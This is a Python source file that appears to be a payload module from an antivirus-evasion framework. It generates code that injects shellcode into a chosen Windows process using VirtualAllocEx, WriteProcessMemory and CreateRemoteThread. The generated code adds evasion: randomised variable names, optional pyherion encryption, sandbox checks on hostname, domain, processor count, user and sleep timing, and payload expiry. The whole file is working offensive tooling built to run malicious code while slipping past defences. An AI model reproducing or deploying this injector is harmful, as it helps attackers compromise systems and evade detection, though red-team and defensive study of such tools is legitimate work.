"""

Payload which injects shellcode into another process (similar to metasploit migrate functionality)

This obviously assumes you have the ability to write into the different process

Help with the injection code came from here - http://noobys-journey.blogspot.com/2010/11/injecting-shellcode-into-xpvista7.html

module by @christruncer

"""

from datetime import date
from datetime import timedelta

from Tools.Evasion.payloads.python import payload_generator_helper
from Tools.Evasion.evasion_common import evasion_helpers
from Tools.Evasion.evasion_common import encryption
from Tools.Evasion.evasion_common import shellcode_help


class PayloadModule:

    def __init__(self, cli_obj):
        # required options
        self.description = "Payload which injects and executes shellcode into the memory of a process you specify."
        self.language = "python"
        self.rating = "Normal"
        self.extension = "py"
        self.name = "Python Process Injector"
        self.path = "python/shellcode_inject/pidinject"
        self.shellcode = shellcode_help.Shellcode(cli_obj)
        self.cli_opts = cli_obj
        self.payload_source_code = ''
        if cli_obj.ordnance_payload is not None:
            self.payload_type = cli_obj.ordnance_payload
        elif cli_obj.msfvenom is not None:
            self.payload_type = cli_obj.msfvenom
        elif not cli_obj.tool:
            self.payload_type = ''
        self.cli_shellcode = False

        # options we require user interaction for- format is {OPTION : [Value, Description]]}
        self.required_options = {
            "COMPILE_TO_EXE" : ["Y", "Compile to an executable"],
            "USE_PYHERION"   : ["N", "Use the pyherion encrypter"],
            "INJECT_METHOD"  : ["Virtual", "Virtual, Void, or Heap"],
            "PID_NUMBER"     : ["X", "Required: Process number to inject code into"],
            "EXPIRE_PAYLOAD" : ["X", "Optional: Payloads expire after \"Y\" days"],
            "HOSTNAME"       : ["X", "Optional: Required system hostname"],
            "DOMAIN"         : ["X", "Optional: Required internal domain"],
            "PROCESSORS"     : ["X", "Optional: Minimum number of processors"],
            "USERNAME"       : ["X", "Optional: The required user account"],
            "SLEEP"          : ["X", "Optional: Sleep \"Y\" seconds, check if accelerated"]
        }

    def generate(self):

        # How I'm tracking the number of nested tabs needed
        # to make the payload
        payload_tabs_tuple = payload_generator_helper.get(self.required_options["EXPIRE_PAYLOAD"][0],self.required_options["HOSTNAME"][0],
                                                            self.required_options["DOMAIN"][0],self.required_options["PROCESSORS"][0],
                                                            self.required_options["USERNAME"][0],self.required_options["SLEEP"][0])
        payload_code = payload_tabs_tuple[0]
        num_tabs_required = payload_tabs_tuple[1]

        # Generate the shellcode
        if not self.cli_shellcode:
            Shellcode = self.shellcode.generate(self.cli_opts)
            if self.shellcode.msfvenompayload:
                self.payload_type = self.shellcode.msfvenompayload
            elif self.shellcode.payload_choice:
                self.payload_type = self.shellcode.payload_choice
                self.shellcode.payload_choice = ''
            # assume custom shellcode
            else:
                self.payload_type = 'custom'
        else:
            Shellcode = self.cli_shellcode

        # Generate Random Variable Names
        ShellcodeVariableName = evasion_helpers.randomString()
        pid_num_variable = evasion_helpers.randomString()
        pagerwx_variable = evasion_helpers.randomString()
        processall_variable = evasion_helpers.randomString()
        memcommit_variable = evasion_helpers.randomString()
        shell_length_variable = evasion_helpers.randomString()
        memalloc_variable = evasion_helpers.randomString()
        prochandle_variable = evasion_helpers.randomString()
        kernel32_variable = evasion_helpers.randomString()

        # Create Payload code
        payload_code += '\t' * num_tabs_required + 'from ctypes import *\n'
        payload_code += '\t' * num_tabs_required + pagerwx_variable + ' = 0x40\n'
        payload_code += '\t' * num_tabs_required + processall_variable + ' = 0x1F0FFF\n'
        payload_code += '\t' * num_tabs_required + memcommit_variable + ' = 0x00001000\n'
        payload_code += '\t' * num_tabs_required + kernel32_variable + ' = windll.kernel32\n'
        payload_code += '\t' * num_tabs_required + ShellcodeVariableName + ' = b\'' + Shellcode + '\'\n'
        payload_code += '\t' * num_tabs_required + pid_num_variable + ' = ' + self.required_options["PID_NUMBER"][0] +'\n'
        payload_code += '\t' * num_tabs_required + shell_length_variable + ' = len(' + ShellcodeVariableName + ')\n'
        payload_code += '\t' * num_tabs_required + prochandle_variable + ' = ' + kernel32_variable + '.OpenProcess(' + processall_variable + ', False, ' + pid_num_variable + ')\n'
        payload_code += '\t' * num_tabs_required + memalloc_variable + ' = ' + kernel32_variable + '.VirtualAllocEx(' + prochandle_variable + ', 0, ' + shell_length_variable + ', ' + memcommit_variable + ', ' + pagerwx_variable + ')\n'
        payload_code += '\t' * num_tabs_required + kernel32_variable + '.WriteProcessMemory(' + prochandle_variable + ', ' + memalloc_variable + ', ' + ShellcodeVariableName + ', ' + shell_length_variable + ', 0)\n'
        payload_code += '\t' * num_tabs_required + kernel32_variable + '.CreateRemoteThread(' + prochandle_variable + ', None, 0, ' + memalloc_variable + ', 0, 0, 0)\n'

        if self.required_options["USE_PYHERION"][0].lower() == "y":
            payload_code = encryption.pyherion(payload_code)

        self.payload_source_code = payload_code
        return
